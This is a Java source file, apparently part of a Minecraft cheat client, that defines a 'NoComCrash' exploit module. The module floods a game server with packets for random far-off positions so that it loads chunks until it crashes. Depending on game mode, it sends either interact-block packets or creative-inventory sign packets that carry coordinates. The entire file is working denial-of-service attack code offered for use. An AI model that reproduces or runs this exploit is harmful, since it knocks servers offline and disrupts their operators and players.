package net.como.client.module.exploit;

import net.como.client.ComoClient;
import net.como.client.module.Module;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.network.packet.Packet;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.minecraft.util.Hand;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;

import java.util.Random;

public class NoComCrash extends Module {
    // TODO add mode setting
    // TODO add amount setting
    public double amount = 1000;
    public int height = 255;

    private Thread worker;

    private Random random = new Random();

    public NoComCrash() {
        setDescription("An old crash exploit that sends random positions to the server causing it to load chunks and eventually crash");
        setCategory("Exploit");
    }

    private BlockPos randomPosition() {
        int k = 16777215;

        return new BlockPos(
            random.nextInt(k),
            height,
            random.nextInt(k)
        );
    }

    private boolean displayedInfo = false;

    private void displayInfo() {
        if (displayedInfo) return;
        displayedInfo = true;

        String method = ComoClient.getInstance().me().isCreative() ? "CreativeInventoryAction" : "PlayerInteractBlock";

        this.info(String.format("Using '%s' packets", method));
    }

    private void perform(int sequence) {
        Packet<?> packet = null;

        // Once again, thank you to 0x150 for this method!
        // Check them out @ https://github.com/0x3C50

        // Get the random position
        BlockPos randPos = randomPosition();

        // Check if we are in creative mode
        if (!ComoClient.getInstance().me().isCreative()) {
            packet = new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(randPos.toCenterPos(), Direction.UP, randPos, false), sequence);
        } else {
            ItemStack item = new ItemStack(Items.OAK_SIGN, 1);
            NbtCompound nbt = item.getOrCreateSubNbt("BlockEntityTag");

            nbt.putInt("x", (int)randPos.getX());
            nbt.putInt("y", (int)randPos.getY());
            nbt.putInt("z", (int)randPos.getZ());

            packet = new CreativeInventoryActionC2SPacket(1, item);
        }

        if (packet == null) return;

        // Display the info
        displayInfo();

        // Send the packet
        ComoClient.getInstance().getClient().getNetworkHandler().sendPacket(packet);
    }

    private void task() {
        this.info("Beginning payload");
        try {
            for (int i = 0; i < amount && ComoClient.getInstance().me() != null && this.isEnabled(); i++) {
                perform(i);
                Thread.sleep(10);
            }
        } catch (Exception e) {
            this.error(String.format("Failed to crash (Exception %s Raised)", e.getClass().getSimpleName()));
            e.printStackTrace();
        }

        if (this.isEnabled()) {
            this.info("Payload complete");
            this.setEnabled(false);
        } else {
            this.info("Payload stopped");
        }
    }

    @Override
    protected void onEnable() {
        super.onEnable();

        // Start the worker
        if (worker == null) {
            worker = new Thread(this::task);
            worker.start();
        }
    }

    @Override
    protected void onDisable() {
        this.worker = null;
        displayedInfo = false;
        super.onDisable();
    }
}
